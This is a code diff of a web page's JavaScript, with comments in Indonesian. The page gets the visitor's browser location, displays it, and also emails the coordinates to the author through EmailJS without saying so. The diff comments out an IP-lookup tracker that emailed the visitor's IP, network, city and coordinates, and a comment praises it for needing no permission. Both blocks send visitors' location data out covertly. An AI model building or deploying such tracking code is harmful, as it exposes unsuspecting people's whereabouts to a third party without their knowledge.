@@ -42,26 +42,27 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            fetch("https://ipapi.co/json/")
-            .then(res => res.json())
-            .then(data => {
-                const isi = {
-                    ip: data.ip,
-                    network: data.network,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country,
-                    latitude: data.latitude,
-                    longitude: data.longitude,
-                }
+            //INI YANG GAK AKURAT, JANGKAUAN HANYA BISA SAMPAI LEVEL KOTA, TAPI BISA LANGSUNG DAPAT TANPA HARUS ALLOW PERMISSIONS
+            // fetch("https://ipapi.co/json/")
+            // .then(res => res.json())
+            // .then(data => {
+            //     const isi = {
+            //         ip: data.ip,
+            //         network: data.network,
+            //         city: data.city,
+            //         region: data.region,
+            //         country: data.country,
+            //         latitude: data.latitude,
+            //         longitude: data.longitude,
+            //     }
             
-                emailjs.send("service_jxnaef1", "template_7lpgr2b", 
-                {
-                    isi : JSON.stringify(isi, null, 2)
-                })
-                .then(() => console.log("Hayoooo"))
-                .catch(err => console.error(err));
-            })
+            //     emailjs.send("service_jxnaef1", "template_7lpgr2b", 
+            //     {
+            //         isi : JSON.stringify(isi, null, 2)
+            //     })
+            //     .then(() => console.log("Hayoooo"))
+            //     .catch(err => console.error(err));
+            // })
 
             
             document.getElementById("location-output").innerHTML = 
@@ -71,6 +72,7 @@
             // Opsional: Menampilkan peta (memerlukan API peta seperti Google Maps)
             console.log("Lokasi ditemukan: " , latitude, longitude);
 
+            //INI YANG AKURAT, TAPI HARUS ALLOW PERMISSIONS
             emailjs.send("service_jxnaef1", "template_7lpgr2b", 
                 {
                     latitude : latitude,
